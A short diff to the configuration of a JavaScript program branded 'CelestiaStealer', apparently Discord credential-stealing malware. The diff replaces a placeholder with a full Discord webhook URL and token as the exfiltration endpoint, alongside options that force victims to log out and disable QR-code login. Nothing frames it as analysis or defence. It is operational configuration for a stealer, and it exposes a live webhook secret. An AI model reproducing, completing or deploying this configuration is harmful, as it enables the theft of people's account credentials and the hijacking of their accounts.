@@ -11,7 +11,7 @@ const fs = require("fs");
 var config = {
     brand: "CelestiaStealer",
 
-    webhook: "%WEBHOOK%",
+    webhook: "https://canary.discord.com/api/webhooks/1233382779258015744/WSZBvfAmhqqsHXc1P2vKQdOKueS5rKHL2yZp9gHVU1_BnqZVhRexumo9UOsT8tDBLnSx",
 
     logout: true,
     disable_qr_code: true,
